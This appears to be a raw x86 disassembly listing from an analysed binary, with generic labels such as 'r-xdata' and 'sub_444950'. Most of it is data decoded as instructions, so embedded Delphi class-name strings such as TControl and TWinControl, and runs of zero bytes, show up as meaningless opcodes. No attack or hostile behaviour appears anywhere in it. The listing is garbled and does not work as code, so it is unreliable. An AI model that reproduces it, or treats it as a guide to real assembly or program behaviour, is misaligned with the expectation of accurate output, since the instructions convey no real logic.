arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
movsb [ edi ] [ esi ]
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + eax * 4 - 0x6097ffbc ] al
inc esp
add [ edi + ebx * 4 + 0x44 ] ah
add [ eax ] dh
inc esp
add al cl
add [ eax + eax + 0x34 ] 0x8a
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add [ eax ] ah
mov bl 0x44
add [ eax + 0x2c004494 ] al
xchg ebp eax
inc esp
add [ eax - 0x7b ] al
inc esp
add [ edx * 4 + 0xe0044 ] cl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x1540040 ] dl
add [ eax ] al
dec ebx
add [ ecx ] al
add ah [ ecx + 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ ecx + eax * 4 + 0x44 ] bl
add al bl
mov al 0x44
add al dl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_444950
inc esp
add [ esi - 0x583bffbc ] dh
inc esp
add [ eax + ebp * 4 ] dl
inc esp
add al dl
cmpsb [ esi ] [ edi ]
inc esp
add ah ch
cmpsd [ esi ] [ edi ]
inc esp
add [ eax + ebp * 4 ] bh
inc esp
add [ eax + ebp * 4 - 0x5683ffbc ] dl
inc esp
add ah dh
test eax 0xaa140044
inc esp
add [ edx + ebp * 4 ] dh
inc esp
add [ edx + ebp * 4 - 0x5533ffbc ] cl
inc esp
add [ ebx + ebp * 4 + 0x44 ] bh
add [ ebx + ebp * 4 - 0x5453ffbc ] ah
inc esp
add [ ebx + ebp * 4 - 0x534bffbc ] dh
inc esp
add ah ah
lodsb [ esi ]
inc esp
add [ ebx + ebp * 4 - 0x5373ffbc ] bh
inc esp
add [ eax ] dh
mov bl 0x44
add [ eax ] cl
lodsd [ esi ]
inc esp
add [ eax ] dl
lodsd [ esi ]
inc esp
add [ eax ] ch
lodsd [ esi ]
inc esp
add [ eax - 0x53 ] al
inc esp
add [ eax - 0x52 ] bl
inc esp
add [ esp + ebp * 4 + 0x44 ] ch
add ah ch
stosd [ edi ]
inc esp
add [ eax ] dl
lodsb [ esi ]
inc esp
add [ ebx + esi * 4 + 0x44 ] bl
add [ eax - 0x5bffbb52 ] bh
mov dl 0x44
add [ esi + edx * 4 + 0x44 ] dh
add al cl
mov eax [ eax + eax + 0x20 ]
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x73ffbb60 ] dl
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0x1bffbb66 ] ah
cwde
inc esp
add [ esp + esi * 4 - 0x6707ffbc ] al
inc esp
add [ eax + ecx * 4 - 0x66dbffbc ] dl
inc esp
add [ ecx + ebx * 4 + 0x44 ] al
add [ eax ] cl
0x9a540044 0x44
push eax
xchg edi eax
inc esp
add [ eax - 0x69 ] ah
inc esp
add al ch
xchg edi eax
inc esp
add al cl
xchg edi eax
inc esp
add ah cl
fwait
inc esp
add al ah
fwait
inc esp
add al bl
scasd [ edi ]
inc esp
add al al
mov cl 0x44
add [ eax ] bl
add [ eax + eax + 0x24 ] 0xa7
inc esp
add [ ebp - 0x579bffbc ] ch
inc esp
add [ ecx + ebp * 4 ] cl
inc esp
add [ eax + ebx * 4 ] dl
inc esp
add [ eax - 0x7e ] dl
inc esp
add [ eax - 0x5fffbb7d ] dl
add [ eax + eax + 0x28 ] 0xffffff82
inc esp
add [ edx + edx * 4 - 0x5d9fffbc ] bl
inc esp
add [ eax - 0x63ffbb79 ] cl
xchg edi eax
inc esp
add [ esi + edx * 4 ] ah
inc esp
add [ edx + eax * 4 ] ah
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax + 0x40004494 ] dl
xchg esi eax
inc esp
add [ eax ] cl
push esp
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
add [ eax ] al
outsd
insb
nop
mov [ edx + 0x44 ] cl
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
je r-xdata
outsd
insb
adc [ eax + 0x44 ] cl
add [ esi + ebp * 2 + 0xb0041 ] ch
or [ ebx + 0x6f ] al
outsb
je r-xdata
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
jmp [ edi + eax * 4 + 0x44 ]
cmp al 0x10
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x44371c74
add [ eax ] bh
add bh bh
mov eax 0x1004491
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
jae r-xdata
hlt
add [ eax + edx ] bh
inc eax
add [ eax ] al
add bh bh
pop ecx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x3bffbdeb ] ch
add [ eax ] al
xchg esp eax
cmp al 0x44
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax + eax ] ah
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
inc [ eax ]
mov [ eax + eax + 0x40 ] eax
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
add bh bh
in al dx
mov [ eax + eax + 0x40 ] al
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
jb r-xdata
add [ 0x6e695754 ] dl
inc ebx
outsd
outsb
je r-xdata
add [ esi + edi * 2 + 0x44 ] bh
add [ ecx + ebx * 2 + 0x59c00045 ] ch
inc ebp
add [ esi + edi * 2 + 0x59e80044 ] dh
inc ebp
add [ eax ] dl
jg r-xdata
add [ eax + 0x7f ] dl
inc esp
add [ edx + ebx * 2 ] cl
inc ebp
inc ebp
add [ eax + 0x7e ] cl
inc esp
add [ ecx + ebx * 2 ] dh
add [ esp + ecx * 2 + 0x240044 ] bl
jns r-xdata
mov ah 0x44
xor eax [ eax ]
shl [ eax ] 0x40
add ah bl
xor [ eax ] al
test al 0x15
inc edx
add ah al
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] 0x0
add edx [ edi + ebp * 2 + 0x70 ]
cmp al 0x10
inc eax
add [ eax ] cl
add bh bh
inc eax
xchg [ eax + eax + 0x1 ] eax
add [ eax ] al
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0x20ff0000 ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
je r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4cb8c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add [ esp + ecx * 2 + 0x69090044 ] dh
insd
inc esp
imul esi [ ebx + 0x61 ] 0x7656c62
sar [ eax + 0x300444c ] 0x8
push esp
add al dh
pop ecx
inc ebp
add [ eax ] dh
jg r-xdata
jae r-xdata
add ah bl
adc eax 0x7ee80042
inc esp
add [ eax ] dl
push ss
inc edx
add [ edi + edi * 2 + 0x15600044 ] dl
inc edx
inc esp
outsd
jb r-xdata
add ah dh
adc eax 0x16480042
inc edx
add ah dl
jge r-xdata
js r-xdata
insb
inc ebx
jne r-xdata
or [ ecx + 0x6d ] ebp
inc ebx
push 0x73656e69
or ch [ gs : ecx + 0x6d ]
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
dec ecx
insd
add al bh
pop ecx
inc ebp
add al dh
mov ah 0x44
add [ eax + eax * 4 ] ah
inc esp
add [ eax + eax * 4 + 0x44 ] ah
inc edx
outsd
jb r-xdata
inc esp
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
je r-xdata
dec eax
jle r-xdata
and [ esp + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
dec esp
inc esp
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x4d ] dh
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
xor [ ebx ] 0x40
add [ ebx + esi + 0x33780040 ] al
inc ecx
add [ eax + 0x1 ] bl
add [ eax ] dl
pop edx
inc ebp
add [ edi + edi * 2 + 0x44 ] dh
add ah ah
jl r-xdata
add [ ecx + ebx * 2 + 0x45 ] bl
add al ch
mov ah 0x44
add al al
jg r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
add [ esi ] al
jb r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
dec ebp
inc esp
add [ ebx ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add [ eax + 0x600444d ] bh
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
inc esp
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
dec ebp
push ebx
dec eax
popad
outsb
jne r-xdata
or ch [ ecx + 0x6d ]
dec esi
inc esp
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ fs : edx + 0x76 ] ah
add [ eax - 0x74ffbbb3 ] edi
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add bh bh
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ esi + ecx * 2 ] dl
inc esp
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
dec ebp
inc esp
add [ ebx + 0x444e18c0 ] cl
rcr [ eax ] 0x4e
inc esp
mov eax 0x8b00444d
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ eax ] al
outsd
insb
jae r-xdata
imul ebp [ ebp + 0x43 ] 0x65736f6c
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
ror [ eax + 0x4d ] 0x44
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 + 0x52600044 ] bh
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
pop eax
dec ebp
inc esp
add [ ecx ] al
or al 0x54
or cl [ eax ]
push esp
dec ecx
insd
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
mov esp 0x300444d
dec edi
inc esp
add [ esi + 0x52 ] cl
outsd
insb
jae r-xdata
mov eax eax
pop esp
dec esi
inc esp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
je r-xdata
inc ebx
outsd
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add al bh
mov ah 0x44
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax + 0xe ] 0x0
add [ edx ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x44 ] dh
add [ ecx + eax ] bh
add [ ebp + ecx * 2 + 0x44 ] al
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
outsd
insb
jae r-xdata
rcr [ esi + ecx * 2 + 0x44 ] 0x0
add [ ebx ] ecx
push esp
inc edx
jbe r-xdata
inc esp
add [ edx + eax ] al
add [ eax ] al
les eax [ edi + 0x44 ]
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
dec esi
push edx
insb
push edi
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh dl
add [ eax ] al
add [ eax ] al
mov esp 0x6000444f
push edx
add bh bh
push esp
dec esi
inc esp
sub_44512a
sub bl bl
inc esp
add [ ebx + ebx * 8 ] bh
inc esp
add [ ebx + ebx * 8 + 0x44 ] cl
add [ edi + ebx * 8 ] cl
inc esp
add [ eax ] ah
fild [ eax + eax + 0x34 ]
fild [ eax + eax + 0x48 ]
fild [ eax + eax - 0x48 ]
or [ ebp ] al
sub al 0xec
inc esp
add [ eax - 0x14 ] al
inc esp
add [ esp + ebp * 8 + 0x44 ] dl
add [ esp + ebp * 8 + 0x44 ] bl
add [ esp + ebp * 8 + 0x44 ] ah
add [ esp + ebp * 8 + 0x44 ] ch
add ah al
in al dx
inc esp
add [ ebp * 8 - 0x12cbffbc ] cl
inc esp
add [ eax + 0x700044ed ] dh
in eax dx
inc esp
add al dh
in eax dx
inc esp
add [ eax ] dh
out dx al
inc esp
add [ esp + ebp * 8 - 0x14c3ffbc ] bl
inc esp
add [ ebx + ebp * 8 - 0x13ffffbc ] cl
inc esp
add [ esp + ebp * 8 ] cl
inc esp
add [ eax - 0x12 ] dh
inc esp
add [ eax ] al
out dx eax
inc esp
add [ eax - 0x12 ] bh
inc esp
add [ eax - 0x77ffbb12 ] al
out dx al
inc esp
add [ eax - 0x4fffbb12 ] dl
out dx eax
inc esp
add [ eax + esi * 8 - 0xf17ffbc ] dl
inc esp
add [ ecx + esi * 8 ] dh
inc esp
add [ eax - 0x13ffbb0f ] dl
out dx al
inc esp
add [ eax + 0x1c0044cd ] dl
test [ eax + eax + 0x6c ] 0xe4
inc esp
add [ eax - 0x1b ] bl
inc esp
add [ eax + 0x540044e5 ] al
jmp r-xdata
add [ esi ] al
inc esp
add ah ch
out 0x44 al
add [ edi - 0x155fffbc ] bh
inc esp
add [ eax - 0x1e ] dl
inc esp
add ah al
std
inc esp
add [ eax - 0xb ] bl
inc esp
add [ eax ] bl
test [ eax + eax + 0x34 ] 0x740044e1
rol [ eax + eax - 0x70 ] 0xf7
inc esp
add [ eax + 0xb0044fb ] ah
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
mov eax eax
pushad
push edx
inc esp
add [ edi ] al
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
mov al 0x44
add [ esp + eax * 4 + 0x44 ] dl
add al al
add [ eax + eax - 0x6c ] 0xffffff8d
inc esp
add ah dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax ] al
or al [ ebp ]
push 0x6400449f
lahf
inc esp
add [ eax ] dh
inc esp
add al cl
add [ eax + eax + 0x34 ] 0x8a
inc esp
add [ eax - 0x3fffbb77 ] bl
xchg edx eax
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add [ edx + 0x44 ] ah
add [ eax ] ah
mov bl 0x44
add [ eax + 0x2c004494 ] al
xchg ebp eax
inc esp
add [ eax - 0x7b ] al
inc esp
add [ edx * 4 + 0xb440044 ] cl
inc ebp
add [ ecx ] al
add [ edi ] cl
add [ edx + ecx + 0x540f0045 ] bl
inc edi
jb r-xdata
outsd
insb
hlt
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
jo r-xdata
push eax
rol [ eax + eax - 0x40 ] cl
je r-xdata
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
adc al 0x45
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
jl r-xdata
add al 0x64
imul ebp [ esi + 0x64 ] 0xc08b776f
pop eax
push esi
inc esp
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah bl
adc al 0x45
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
insd
inc ebx
outsd
outsb
je r-xdata
dec esi
inc esp
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
popad
dec esp
imul esi [ ebx + 0x74 ] 0x44572090
add [ edi ] al
push cs
push esp
inc esp
jb r-xdata
add [ eax - 0x77ffba8d ] dl
adc [ edx ] eax
push esp
adc [ edx ] al
cwde
adc [ edx ] eax
nop
adc al [ edx ]
aam 0x14
inc edx
add [ eax + 0x33 ] bh
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + 0x74500045 ] bh
inc ebp
add al bl
ja r-xdata
imul ebp [ esi + 0x64 ] 0x554c776f
inc esp
add ah dl
push esp
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add ah bl
xor [ eax ] al
fcom [ eax * 2 + 0x4502f000 ]
outsd
insb
nop
fcom [ esp + eax * 2 ]
pop es
push cs
push esp
inc ebx
jne r-xdata
fcom [ eax * 2 + 0x4502f000 ]
add [ eax ] bl

imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
rcl [ edx + 0x44 ] 0x1
add [ edx + ecx * 2 + 0xb0044 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ebp + 0x74500045 ] bh
inc ebp
add al bl
ja r-xdata
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov al 0x64
inc ebp
add [ edx ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
inc eax
dec ecx
insd
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ 0x6f840045 ] bl
inc ebp
add [ ecx + edx + 0x45 ] ch
add [ esp + edi * 2 + 0x7d180045 ] cl
inc ebp
add [ eax + 0xe004512 ] dh
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata

je r-xdata
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0x4004514 ] al
inc [ eax + eax + 0x20 ]
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ esi + eax * 8 + 0x44 ] ah
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x28 ] 0x1004515
add [ edi ] cl
add [ edx + 0x540e0045 ] cl
inc ebx
jne r-xdata
outsd
insb
jae r-xdata
imul esi [ ebx + 0x74 ] 0x4457e890
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
sbb al 0x57
inc esp
add [ eax + eax ] cl
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax - 0x77ffba8d ] dl
adc [ edx ] eax
push esp
adc [ edx ] al
cwde
adc [ edx ] eax
nop
adc al [ edx ]
aam 0x14
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ 0x6f840045 ] bl
inc ebp
add [ ecx + edx + 0x45 ] ch
add [ esp + edi * 2 + 0x7d180045 ] cl
inc ebp
add [ eax + 0xa004512 ] dh
push esp
dec ecx
insd
popad
dec esp
outsd
insb
jae r-xdata
inc ebp
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ ebx + 0x4456c8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push edi
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 ] cl
inc esp
add [ eax + eax ] bh
add [ esp ] al
add [ eax ] bl
insd
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x4453f0c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push esp
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 2 + 0x54c40044 ] bh
inc esp
add [ edx + eax ] cl
add [ eax ] al
test al 0x4e
inc eax
outsd
insb
jae r-xdata
add [ ebp + 0x57940040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push edi
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push edi
inc esp
add [ eax + 0x7c000000 ] al
push esi
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ eax + 0xb ] cl
inc ebp
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ ebx + ecx - 0x369fffbb ] dh
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
